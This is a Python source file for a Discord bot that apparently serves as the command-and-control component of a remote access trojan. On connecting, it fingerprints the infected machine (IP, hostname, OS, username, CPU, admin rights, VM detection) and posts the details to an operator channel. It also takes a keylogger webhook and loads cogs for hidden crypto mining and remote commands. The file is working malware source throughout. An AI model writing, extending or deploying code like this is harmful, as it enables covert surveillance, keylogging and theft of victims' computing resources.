
import discord
from discord.ext import commands
from datetime import datetime
from libraries import maciassdopia


class BOT(commands.Bot):
    def __init__(self, channel:int, guild:discord.Object, id:str, keylog_webhook:str):
        self.channel = channel
        self.guild = guild
        self.id = id
        self.keylog_webhook = keylog_webhook

        self.active_interactions = False
        self.active_mining = False

        self.msg = None
        self.color = None

        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix = "!", intents = intents, help_command=None)
        

    async def on_ready(self):
        await self.wait_until_ready()

        self.channel = self.get_channel(self.channel)
        now = datetime.now()

        my_embed = discord.Embed(title = f"{self.msg}", description = f"**Time: {now.strftime('%d/%m/%y %H:%M:%S')}**", color = self.color)
        my_embed.add_field(name = "**IP**", value = maciassdopia.getIP(), inline = True)
        my_embed.add_field(name = "**Bits**", value = maciassdopia.getBits(), inline = True)
        my_embed.add_field(name = "**HostName**", value = maciassdopia.getHostname(), inline = True)
        my_embed.add_field(name = "**OS**", value = maciassdopia.getOS(), inline = True)
        my_embed.add_field(name = "**Username**", value = maciassdopia.getUsername(), inline = True)
        my_embed.add_field(name = "**CPU**", value = maciassdopia.getCPU(), inline = False)
        my_embed.add_field(name = "**Is Admin**", value = maciassdopia.isAdmin(), inline = True)
        my_embed.add_field(name = "**Is VM**", value = maciassdopia.isVM(), inline = True)
        my_embed.add_field(name = "**Auto Keylogger**", value = False, inline = True)

        await self.channel.send(embed = my_embed)
    

    async def setup_hook(self):
        await self.load_extension("code.discord.cogs.cryptoMining")
        await self.load_extension("code.discord.cogs.commands")
        await self.tree.sync(guild = self.guild)

        
    async def on_command_error(self, ctx, error):
        my_embed = discord.Embed(title = f"**Error:** {error}", color=0xFF0000)
        await ctx.reply(embed = my_embed)
        